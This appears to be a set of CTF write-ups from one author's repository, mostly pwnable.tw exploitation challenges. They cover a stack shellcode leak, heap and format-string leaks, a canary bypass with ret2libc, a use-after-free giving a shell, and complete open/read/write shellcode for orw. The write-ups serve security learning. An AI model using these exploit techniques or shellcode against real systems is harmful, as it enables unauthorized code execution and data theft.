最後是傳輸內容的部分，在透過 socket 傳輸時，因為不知道對方要傳什麼內容，所以必須先訂好一些傳輸的規則，否則對方收到的就只是一大片的資料而已，完全不知道怎麼切割。一般來說會分成兩種，第一種是既定的格式，最前面的 key exchange 就屬於這種，事先就講好 backdoor 傳 8 bytes，而 C2 回 8 bytes，第二種則是不固定長度的，常會用在傳檔案或字串的時候，可以像這題一樣，先傳一個固定長度 (這題為 4 bytes) 表示長度，接著就只要接收該長度的資料即可，也可以透過特殊前後綴，例如 `<BEGIN>...<END>` 來標示出資料的範圍。

綜合以上幾個概念，就可以順利的解開這題了，不過一直到最後我丟出一堆提示才有人解開QQ，我覺得可能是因為同學對 backdoor 研究較少，因此對許多線索比較不敏感。其實這題我在出完後還有拿給在 Forensic 方面有研究的前輩看看，我們覺得線索給的夠多，應該是不會太通靈，他有建議我一些降低難度的方法，例如可以直接在流量中傳遞整個 backdoor，之後再透過 backdoor 做之後的傳輸，不過覺得這樣就變成單純的 dump binary 然後 reverse 了，有點無趣，所以才保留了原始的作法。


### File: CTF/README.md

# CTF

frozenkp's CTF Writeups & useful tools

## Writeups

| Year  | CTF               | Challenge                 | Category    | Keyword                           |
| ----- | ----------------- | ------------------------- | ----------- | --------------------------------- |
| 2014  | NoConName qual    | inBINcible                | reverse     | Golang, xor                       |
| 2015  | B-sides vancouver | delphi                    | reverse     | Golang, cmd injection             |
| 2017  | HITB CTF          | 2017, Dating in Singapore | misc        |                                   |
| 2017  | HITB CTF          | Flying High               | misc        | UBIfs                             |
| 2017  | HITB CTF          | Pasty                     | web         | Jwt                               |
| 2017  | Seccon CTF        | Qubic Rube                | programming | QRcode                            |
| 2017  | Seccon CTF        | putchar music             | programming |                                   |
| 2018  | BambooFox CTF     | infant-gogogo             | pwn         | Golang, buffer overflow           |
| 2018  | BambooFox CTF     | infant-gotoheaven         | pwn         | Golang, buffer overflow           |
| 2018  | BambooFox CTF     | water-impossible          | pwn         | buffer overflow                   |
| 2018  | ASIS CTF qual     | Plastic                   | misc        | base64, binwalk                   |
| 2018  | ASIS CTF qual     | Trashy Or Classy          | forensic    | casync                            |
| 2018  | ASIS CTF qual     | Buy flags                 | web         | Flask, json                       |
| Other | pwnable.tw        | Start                     | pwn         | Buffer overflow, stack executable |
| Other | pwnable.tw        | orw                       | pwn         | shellcode(open, read, write)      |
| Other | pwnable.tw        | hacknote                  | pwn         | Heap use after free               |
| Other | pwnable.tw        | dubblesort                | pwn         | Buffer overflow                   |
| Other | pwnable.tw        | criticalheap              | pwn         | localtime_TZ, format string       |

## Useful Tools

### Dockerfile

Pwn environment in docker, inclusive of peda, pwngdb, one_gadget, readelf….

```bash
$ docker pull frozenkp/pwn
$ docker run -it {--name pwn_env} {-v /??/data:/root/data} --privileged frozenkp/pwn /bin/bash
$ docker exec -it pwn_env /bin/bash
```




### File: CTF/others/pwnable.tw/Start/README.md

Start
===

## Problem
Just a start.

`nc chall.pwnable.tw 10000`

[start](https://pwnable.tw/static/chall/start)

### nc
```
Let's start the CTF:{input}
```

## Observation
### Read length
can read **0x3c** bytes

![](https://i.imgur.com/PCJNe4r.png)

### Buf
store on stack and **stack excutable**

![](https://i.imgur.com/zMCZ1I7.png)

### Ret
Payload = 20 bytes

## Solution
### Leak stack address
If we want to execute code on stack, we should return $PC to stack at first. However, stack address is not always the same. Thus, we should leak stack address in the beginning.

#### Target
There is an address (`0xffffd220`) after return address.

**$esp** will be `0xffffd21c` ( --> `0xffffd220`) after return, then we can use **write** to print this address.

![](https://i.imgur.com/gevRuVg.png)

#### Return
Return to `mov ecx, esp` before **write** to mov buffer to the target.

![](https://i.imgur.com/2dfPkF0.png)

### Shellcode
After leaking address, we get another chance to write. Buffer is $esp (still on the stack).

#### Target
I found that return address on the stack is `0x%%%%%%T0`
- % from the address leaked in advance
- T is a random number from 0 to f

Therefore, just put `0x%%%%%%T4` at return address. Then write shellcode after it.

![](https://i.imgur.com/EZAE3C4.png)
#### Which number is T ?
There are 16 possible numbers, so just **guess** !!!

You will get shell if you are fortunate enough. OwO




### File: CTF/others/pwnable.tw/criticalheap/README.md

# criticalheap

> Challenge link: [criticalheap](https://pwnable.tw/challenge/#8)
>
> Category: pwn
>
> Writeup: [criticalheap](https://github.com/frozenkp/CTF/tree/master/others/pwnable.tw/criticalheap)

There are some secrets . Try to capture `/home/critical_heap++/flag`.

We recommend you to use the provided docker environment to develop your exploit:

`nc chall.pwnable.tw 10500`

[critical_heap.tar.gz](https://pwnable.tw/static/chall/critical_heap.tar.gz)

## Observation

這題有很多個選項可以使用，以下講可能會用到的部分

### struct

這題有三個 struct (normal, time, system) 在一個 union，一開始就先在 .bss 段宣告長度 10 的 struct 陣列，其中某些變數 (name, value...) 是存字串的指標

#### normal

```
00000000 name
...
00000018 content
...
```

#### system

```
00000000 name
...
00000020 value
...
```

### create

#### name

name 的部分是先 read 進來以後，用 strdup 放到 struct 上的，所以也是存在 heap 上

![](https://i.imgur.com/fbl69dp.png)

#### normal

normal 的部分需要輸入 content，它是直接 read 到 rax + 0x18 (struct 上的 0x18) 的位置，沒有在後面補上 `0x00`

![](https://i.imgur.com/7ZPpc3s.png)

#### time

time 會用 localtime 拿取現在的時間以後，處理完存進 struct

![](https://i.imgur.com/Th8VE6i.png)

localtime 先使用 getenv 抓取環境變數 TZ 的值，接著讀出 TZ 所指的檔案，並將內容存在 heap 上

![](https://i.imgur.com/kzabx9I.png)

![](https://i.imgur.com/XUBYeD0.png)

### play_system

#### Set the name for the heap

這個功能其實就是 setenv

![](https://i.imgur.com/JeUENVX.png)

#### Unset the name in the heap

這個功能是 unsetenv

![](https://i.imgur.com/GtViGDw.png)

#### Get the value of name

這個功能比較特別，會先用 getenv 抓輸入的 name，接著將抓到的指標 (指向 heap 上存 value 處) 存在 rax + 0x20 (struct 上 0x20 的位置)

![](https://i.imgur.com/R67Ah33.png)

### play_normal

#### Show the content of heap

這個功能有 format string 的漏洞，而且是使用 printf_chk

![](https://i.imgur.com/ssfVY7r.png)

### delete

delete 實際上只有把指定的 struct 標成 0 而已，上面的資訊並沒有清空

![](https://i.imgur.com/WLIYn6j.png)

### Conclusion

- create_normal 讀取 content 時沒有結尾
- play_normal 有 format string 的漏洞
- setenv 可以改動 TZ 的值
- delete 沒有清空

## Solution

解法步驟如下：

1. leak heap base 位置
2. 利用 setenv 改動 TZ 以後，用 localtime 將 flag 讀到 heap 上
3. 利用 format string 印出 flag

### leak heap base

這個部分要利用 "delete 沒有清空" 的漏洞

先創 system，接著到 play 隨便創一個環境變數，再使用 play_system_get_value 來將環境變數的位址放到 struct 上，這是為了取得一段 heap address

```
0x000 name
0x020 value  (heap address)
```

接著 delete 掉，然後創一個 normal 的 struct，此時 normal struct 會蓋在 system struct 原本的位置上

因為 content 存在 0x18，與原本的 value 差 0x8，要輸入 8 個字元才能碰到 value 的位置

>不要輸入 \n 不然輸出會被截斷

```
0x000 name
0x018 content ('AAAAAAAA')
0x020 value  (heap address)
```

最後就使用 show 把 struct 印出來就可以得到 heap address 了

因為在 heap 上相對位置不變，用 gdb 看一下跟 base 差多遠，leak 出來後減掉就是 heap base 了

### TZ

這個部分就創一個 system 然後用 setenv 把 TZ 設成 `/home/critical_heap++/flag`

接著創一個 time struct，就會在 localtime 將 flag 讀取到 heap 上了，然後用 gdb 看一下 offset 搭配 heap base 就可以知道 flag address 了

![](https://i.imgur.com/o5RZhBc.png)

### format string

利用 format string 搭配 %s 可以 leak 任意位址的特性來 leak flag address

另外，因為是使用 printf_chk 的關係，不能使用 `$` 要自己用 %c 來跳到指定區域

![](https://i.imgur.com/wniwxLP.png)

## Note

### peda in docker

這次有給一個 docker 的環境，要在裡面使用 gdb-peda 的話，要改動以下設定

#### Dockerfile

```dockerfile
RUN apt-get install gdb git -y
WORKDIR /root
RUN git clone https://github.com/scwuaptx/Pwngdb.git ; cp ~/Pwngdb/.gdbinit ~/
RUN git clone https://github.com/scwuaptx/peda.git ~/peda ; echo "source ~/peda/peda.py" >> ~/.gdbinit ; cp ~/peda/.inputrc ~/
```

#### docker-compose.yml

```yaml
critical_heap:
    cap_add:
        - SYS_PTRACE
```




### File: CTF/others/pwnable.tw/dubblesort/README.md

# dubblesort

> Challenge link: [dubblesort](https://pwnable.tw/challenge/#4)
>
> Category: pwn

Sort the memory!

`nc chall.pwnable.tw 10101`

[dubblesort](https://pwnable.tw/static/chall/dubblesort)

[libc.so](https://pwnable.tw/static/libc/libc_32.so.6)

## Observation

一開始程式先問了**名字**，接著問要**排列幾個數字** ，最後依序輸入**各個數字**後會排列完輸出結果

看到這題時，我想到之前在 `csie.ctf.tw` 有寫過一題 bubblesort ，那題是透過排列的數字沒有限制數量來蓋到 return address，或許這題有類似的漏洞

```bash
$ ./dubblesort
What your name :a
Hello a
,How many numbers do you what to sort :3
Enter the 0 number : 0
Enter the 1 number : 1
Enter the 2 number : 2
Processing......
Result :
0 1 2
```

### file

```bash
$ file dubblesort
dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped
```

### checksec

保護全開

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

### input

名字是使用 `read()` 來讀取，讀取的長度是 0x40

```bash
   0x56555a11 <main+78>:	mov    DWORD PTR [esp],0x0
=> 0x56555a18 <main+85>:	call   0x56555630 <read@plt>
   0x56555a1d <main+90>:	mov    DWORD PTR [esp+0x8],esi
Guessed arguments:
arg[0]: 0x0
arg[1]: 0xffffd72c --> 0xff17
arg[2]: 0x40 ('@')
```

要排列的數量是使用 `scanf()` ，且參數是 `%u` 也就是 unsigned int

```bash
   0x56555a45 <main+130>:	mov    DWORD PTR [esp],eax
=> 0x56555a48 <main+133>:	call   0x56555700 <__isoc99_scanf@plt>
   0x56555a4d <main+138>:	mov    eax,DWORD PTR [esp+0x18]
Guessed arguments:
arg[0]: 0x56555bfa --> 0x45007525 ('%u')
arg[1]: 0xffffd708 --> 0xe0
```

接著數字的部分一樣是使用 `scanf()` 加上 `%u` 

```bash
   0x56555a92 <main+207>:	mov    DWORD PTR [esp],eax
=> 0x56555a95 <main+210>:	call   0x56555700 <__isoc99_scanf@plt>
   0x56555a9a <main+215>:	add    esi,0x1
Guessed arguments:
arg[0]: 0x56555bfa --> 0x45007525 ('%u')
arg[1]: 0xffffd70c --> 0xf7f37f0a (mov    edx,DWORD PTR [esp+0x18])
```

### sort

sort 的參數是 要排列的數量 以及 第一個數字在 stack 上的位址，排列的方式看起來沒什麼問題

```bash
   0x56555ab0 <main+237>:	mov    DWORD PTR [esp],eax
=> 0x56555ab3 <main+240>:	call   0x56555931
   0x56555ab8 <main+245>:	lea    eax,[ebx-0x138c]
Guessed arguments:
arg[0]: 0xffffd70c --> 0x0
arg[1]: 0x3
----------------------- stack -----------------------
0028| 0xffffd70c --> 0x0 		# num 0
0032| 0xffffd710 --> 0x1		# num 1
0036| 0xffffd714 --> 0x2 		# num 2
```

### name

在測試 name 的時候，發現有時候會輸出一些不可視字元

```bash
./dubblesort
What your name :aaaa
Hello aaaa
y��/,How many numbers do you what to sort :
```

經過觀察後發現應該是因為 name 沒有將所有空間先歸零，所以輸出時才會連同後面的舊資料一起輸出

### stack canary

因為有開 canary 的關係，就算沒有檢查最多可以輸入幾個數字，再輸入超過時依然會噴錯

```bash
*** stack smashing detected ***: ./dubblesort terminated
```

利用二分搜的方式測試，發現最多只能輸入到 24 個數字，如果到第 25 個數字的話，在排列時就會噴出以上的錯誤訊息

## Solution

總共有三個步驟要做

1. leak libc
2. bypass canary
3. ret2libc

### Leak libc

這邊我利用的是 name

因為 name 的 buffer 沒有先清空的關係，所以可以 leak 出後面的數值

```bash
0060| 0xffffd72c ("aaaa\n\331\377\377/")
0064| 0xffffd730 --> 0xffffd90a --> 0xfb6d2200
0068| 0xffffd734 --> 0x2f ('/')
0072| 0xffffd738 --> 0x8e
0076| 0xffffd73c --> 0x16
0080| 0xffffd740 --> 0x8000
0084| 0xffffd744 --> 0xf7fcb000 --> 0x1b1db0
0088| 0xffffd748 --> 0xf7fc9244 --> 0xf7e31020 (call   0xf7f38b59)    <==
```

由上面 stack 內容可知，第 8 個包含一個位址，可以記錄下此時 libc base 與其之間的差值，並在真正 leak 出此值時減掉差值，即可得到 libc base

```bash
0xf7fc9244 - libc_base = x (固定的)
leak_addr - x = libc_base
```

只要輸入 28 (4*7) 個字元作為 payload ，就可以印出這個位址的值了

```bash
0060| 0xffffd72c ('a' <repeats 28 times>, "\n\222\374\367\001VUV\251WUV\240oUV\001")
0064| 0xffffd730 ('a' <repeats 24 times>, "\n\222\374\367\001VUV\251WUV\240oUV\001")
0068| 0xffffd734 ('a' <repeats 20 times>, "\n\222\374\367\001VUV\251WUV\240oUV\001")
0072| 0xffffd738 ('a' <repeats 16 times>, "\n\222\374\367\001VUV\251WUV\240oUV\001")
0076| 0xffffd73c ('a' <repeats 12 times>, "\n\222\374\367\001VUV\251WUV\240oUV\001")
0080| 0xffffd740 ("aaaaaaaa\n\222\374\367\001VUV\251WUV\240oUV\001")
0084| 0xffffd744 ("aaaa\n\222\374\367\001VUV\251WUV\240oUV\001")
0088| 0xffffd748 --> 0xf7fc920a --> 0x0
```

### bypass canary

在 observation 時，有利用二分搜的方式找到 canary 的位置在第 25 個

此時可以利用輸入時的 `scanf("%u")` ，一般在輸入時，要輸入 unsigned int 才會被接受，但是這樣會蓋掉 canary ，經過搜尋後才知道，原來可以輸入 '+'，此時會被當作正常輸入，但保留此位置原始的值，直接跳到下一個，如此一來就可直接繞過 canary 了

### ret2libc

要做到 ret2libc 的話達成兩個條件

- libc base
- return address

libc base 在先前已經透過 name 取得了，想要控制 return address 的話，可以利用輸入數字時的 buffer overflow，因為已經跳過 canary 了，所以可以一直推到 return 的位置，並進而控制 return address

這邊我一樣用二分搜的方式來做，如果有蓋到 return address 的位置的話會出現以下訊息

```bash
[*] Process './dubblesort' stopped with exit code -11 (SIGSEGV) (pid 2290)
```

搜尋過後知道 return address 是在第 33 個位置

```bash
24(payload) + canary + 7 + ret
```

最後就是使用 libc base 找到 `system` 以及 `/bin/sh` 串接在 return address 的位置即可

## Note

### pwntool libc

因為有給 libc ，所以在本機測試時最好是掛上 libc ，否則位址可能會跟遠端不同

```python
r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})
```

### sort

在輸入 payload 時，因為輸入完後還會進行排序，所以要確保排序過後順序依然不變

我的作法是前 24 個字就直接輸入 0~23 ，canary 的部分輸入 + (43)，接著後面的 7 個字放 libc base，最後 `system` 及 `/bin/sh` 因為要加上 libc base ，所以一定比 libc base 大

### system

在呼叫 system 時，stack 第一個位置是結束後的 return address，因為不會 return 了，所以隨便填就可以了，接著才是 system 的第一個參數 `/bin/sh` 


### File: CTF/others/pwnable.tw/hacknote/README.md

# hacknote

> Challenge Link: [hacknote](https://pwnable.tw/challenge/#5)
>
> Category: pwn

A good Hacker should always take good notes!

`nc chall.pwnable.tw 10102`

[hacknote](https://pwnable.tw/static/chall/hacknote)

[libc.so](https://pwnable.tw/static/libc/libc_32.so.6)

## Observation

This challenge is a Hacknote. There are 4 features (actually 3) - **Add, Delete, and Print**.

```
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :20
Content :abcd 
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :3
Index :0
abcd

----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :4
```

I wrote another challenge in `csie.ctf.tw` also called "hacknote" before, and both of these look similar.

In hacknote (csie), this program `malloc` when add and `free` when delete. However, **it didn't set the pointer to `NULL` **. Therefore, we can use add to write something, and use print to run.

What do I mean ? Let's try !

### Experiment

#### Add two notes

I add two notes with size 32 and contents are "aaaa" and "bbbb".

Here is the value on the heap.

```
0x804b000:	0x00000000	0x00000011	  0x0804862b	0x0804b018
0x804b010:	0x00000000	0x00000029	  0x61616161	0x0000000a 	<======= note "aaaa"
0x804b020:	0x00000000	0x00000000	  0x00000000	0x00000000
						-----------------------------
0x804b030:	0x00000000	0x00000000	| 0x00000000	0x00000011
            -------------------------------------
0x804b040:	0x0804862b	0x0804b050	  0x00000000	0x00000029
0x804b050:	0x62626262	0x0000000a	  0x00000000	0x00000000 	<======= note "bbbb"
0x804b060:	0x00000000	0x00000000	  0x00000000	0x00000000
```

Let's focus on note "aaaa".

```
           ------------------------------------------------------
0x804b000: | 0x00000000	0x00000011	0x0804862b  0x0804b018  | <======= struct note
   	   ---------------------------------------------|--------
   		   					|
   		   			    -------------
   		   			    |
           ---------------------------------v--------------------
0x804b010: | 0x00000000	0x00000029	0x61616161  0x0000000a 	|
0x804b020: | 0x00000000	0x00000000	0x00000000  0x00000000	| <======= content
0x804b030: | 0x00000000	0x00000000				|
   	   ------------------------------------------------------
```

The first 8 bytes of each blocks are headers of  heap.

- struct note is 0x10

- `0x0804862b`is print function

  ```
   804862b:       55                      push   ebp
   804862c:       89 e5                   mov    ebp,esp
   804862e:       83 ec 08                sub    esp,0x8
   8048631:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
   8048634:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]
   8048637:       83 ec 0c                sub    esp,0xc
   804863a:       50                      push   eax
   804863b:       e8 90 fe ff ff          call   80484d0 <puts@plt>
   8048640:       83 c4 10                add    esp,0x10
   8048643:       90                      nop
   8048644:       c9                      leave  
   8048645:       c3                      ret
  ```

#### Delete

I delete note "aaaa" (index 0) first, then I delete note "bbbb" (index 1).

Here is the fastbin in heap.

```
(0x10)     fastbin[0]: 0x804b038 --> 0x804b000 --> 0x0
(0x18)     fastbin[1]: 0x0
(0x20)     fastbin[2]: 0x0
(0x28)     fastbin[3]: 0x804b048 --> 0x804b010 --> 0x0
(0x30)     fastbin[4]: 0x0
(0x38)     fastbin[5]: 0x0
(0x40)     fastbin[6]: 0x0
                  top: 0x804b070 (size : 0x20f90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

#### Reallocate

I add a new note with size **0x8** (0x8 + header = 0x10). Note 2 is allocated to 0x804b038, and it's content is 0x804b000 (original note 0).

```
	      ---------------------------------------------------------------
0x804b000:    | 0x00000000      0x00000011      0x61616161      0x0804b00a  | <== content
 	      ---------------------------------------------------------------
0x804b010:      0x00000000      0x00000029      0x00000000      0x0000000a
0x804b020:      0x00000000      0x00000000      0x00000000      0x00000000
					     --------------------------------
0x804b030:      0x00000000      0x00000000   |  0x00000000      0x00000011  |
	      -------------------------------- 				    | <== struct
0x804b040:    | 0x0804862b      0x0804b008 				    |
	      ---------------------------------------------------------------
```

## Solution

Accroding to the experiment above, we can exploit it by reusing note.

### Leak libc

First, we should leak the base of libc in order to using system().

I choose `puts_got = 0x804a024`to leak.

Because of the size of struct is 0x10, we can only use only 0x8 as content size (0x8 + header = 0x10). Thus, I put `printNote function` and `puts_got`in content to leak base.

After adding note 2, note 0 is like this:

```c
struct note {
	printNote(); 		// 0x0804862b
  	puts_got; 		// 0x804a024
}
```

When we print note 0, it will call printNote() then print puts_got.

### System()

Before printing note, this program send address of note as parameter to function.

![](https://i.imgur.com/dYKZzfa.png)

```
					    -----------------
0x804b000:      0x00000000      0x00000011  |   0x0804862b  |    0x0804b018
					    -----------------
0x804b010:      0x00000000      0x00000029      0x61616161      0x0000000a
```

What if this function is system() ?? Value from `0x804b008`would be considered as string.

Therefore, we can put something like `;sh` in content. Because string before `;` can not be executed, we have to add a `;` to split it. 

After printing (system), a shell will prompt !!



### File: CTF/others/pwnable.tw/orw/README.md

# orw

> Challenge link: [orw](https://pwnable.tw/challenge/#2)
>
> Category: pwn
>
> Writeup: [orw](https://github.com/frozenkp/CTF/tree/master/others/pwnable.tw/orw)

Read the flag from `/home/orw/flag`.

Only `open` `read` `write` syscall are allowed to use.

`nc chall.pwnable.tw 10001`

[orw](https://pwnable.tw/static/chall/orw)

## Observation

這題題意很簡單，就是輸入 shellcode，它會幫你執行

題目敘述中有說只能使用 `open` `read` `write`，且 flag 在 `/home/orw/flag` ，所以步驟如下

- open('/home/orw/flag')
- read to buffer
- write to stdout

![](https://i.imgur.com/x1eEwmd.png)

## Try

我一開始試著使用 pwntool 中內建的[工具](http://docs.pwntools.com/en/stable/shellcraft/i386.html)，但無法成功讀出檔案

```python
>>> print shellcraft.i386.linux.cat('/home/orw/flag')
    /* push '/home/orw/flag\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    /* open(file='esp', oflag='O_RDONLY', mode=0) */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=2147483647) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x7fffffff
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80
```

## Solution

最後我選擇參考 [x86 syscall](https://syscalls.kernelgrok.com/) 逐步構造出 `open` `read` `write` 

- `open(file='esp', oflag='O_RDONLY', mode=0)`
  - 這個我採用 pwntool 輸出的寫法
- `read(fd, buf, length)`
  - `eax` 是 0x3
  - `fd` 存在 `open()` 的回傳結果 (`eax`)
  - `buf` 選在 `esp`
  - `length` 是 60
- `write(stdout, buf, length)`
  - `eax` 是 0x4
  - `stdout` 是 1
  - `buf` 是剛剛讀取的 `esp`
  - `length` 是 60

```assembly
/* push '/home/orw/flag\x00' */
        push 0x1010101
        xor dword ptr [esp], 0x1016660
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
/* open(file='esp', oflag='O_RDONLY', mode=0) */
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
/* call open() */
        push SYS_open /* 5 */
        pop eax
        int 0x80
/*call read()*/
        push eax
        push 0x3
        pop eax
        pop ebx
        push 60
        pop edx
        mov ecx, esp
        int 0x80
/*call write()*/
        push 0x4
        pop eax
        push 0x1
        pop ebx
        push 60
        pop edx
        mov ecx, esp
        int 0x80
```


